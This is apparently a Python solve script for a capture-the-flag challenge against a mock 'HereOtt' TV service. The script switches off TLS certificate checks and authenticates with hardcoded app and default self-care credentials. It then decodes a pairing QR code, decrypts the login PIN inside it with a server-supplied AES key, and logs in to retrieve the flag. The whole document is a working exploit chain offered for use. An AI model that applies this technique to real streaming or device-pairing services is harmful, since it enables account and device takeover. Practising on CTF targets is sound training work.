from base64 import b64decode
from uuid import uuid4

import cv2
import numpy as np
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from requests import Session

# run this to install dependencies:
# pip install opencv-python numpy requests pycryptodome

base = "https://hereott.honeylab.hu:48490"

session = Session()
# # get script's directory
# script_dir = os.path.dirname(os.path.realpath(__file__))
# # get certificate path
# cert_path = os.path.join(script_dir, "backend", "assets", "cert.pem")
# print("cert_path:", cert_path)
# # add certificate to session
# session.verify = cert_path
# for some reason this doesn't work, so we'll just disable certificate verification
session.verify = False
# disable SSL warnings
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# get instance from redirecter
response = session.get(base, allow_redirects=False)
base = response.headers.get("Location")[:-1]
print("base:", base)

# call config endpoint
params = {
    "username": "HereOttMobileApp",
    "password": "OTc5NjdhZjBkYjQ3OGU4NDJlMTZkYmY3YWVhNmU5M2E",
    "version": "1.0.0",
    "app": "hu.honeylab.cyberquest.hereott",
    "uuid": str(uuid4()),
}
response = session.get(
    base + "/v1/config", params=params, headers={"X-Platform": "Android"}
)
response_json = response.json()
# get appsListUrl
apps_list_url = response_json["appsListUrl"]
print("appsListUrl:", apps_list_url)

# get apps list
response = session.get(apps_list_url)
response_json = response.json()

selfcare = next((app for app in response_json if app["appid"] == "selfcare"), None)
selfcare_url = selfcare["url"]
print("selfcare_url:", selfcare_url)

# get QR code for pairing
headers = {
    "uid": "1",
    "uuid": str(uuid4()),
    "SerialNumber": "862-8632531",  # wasm generates this, but can be hardcoded
}
login = {
    "username": "hereottselfcare",
    "password": "hereottselfcare",
}
response = session.post(
    base + "/selfcare/selfcare-backend/device/pair",
    headers=headers,
    auth=(login["username"], login["password"]),
)
response_json = response.json()

qr_code = response_json["qrCode"]
iv = bytes.fromhex(response_json["iv"])

# decode QR code
qr_code = b64decode(qr_code)
# load QR code as png image
qr_code = cv2.imdecode(np.frombuffer(qr_code, np.uint8), cv2.IMREAD_COLOR)
detector = cv2.QRCodeDetector()
try:
    value, points, straight_qrcode = detector.detectAndDecode(qr_code)
except ValueError as e:
    print(
        "Sometimes this happens due to opencv's imperfect QR model. In this case, just run the script again."
    )
    raise e
print("value:", value)

status, key, encrypted = value.split("|")
key = b64decode(key)
print("key:", key.hex())
encrypted = b64decode(encrypted)

# decrypt encrypted data
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
decrypted = cipher.decrypt(encrypted)
decrypted = unpad(decrypted, AES.block_size)
pin = decrypted.decode()
print("pin:", pin)

# pair device
headers = {
    "uuid": str(uuid4()),
}
json_data = {
    "pinCode": pin,
}
response = session.post(base + "/v1/loginWithCode", headers=headers, json=json_data)
print("Flag:", response.headers.get("Cyberquest-Flag"))
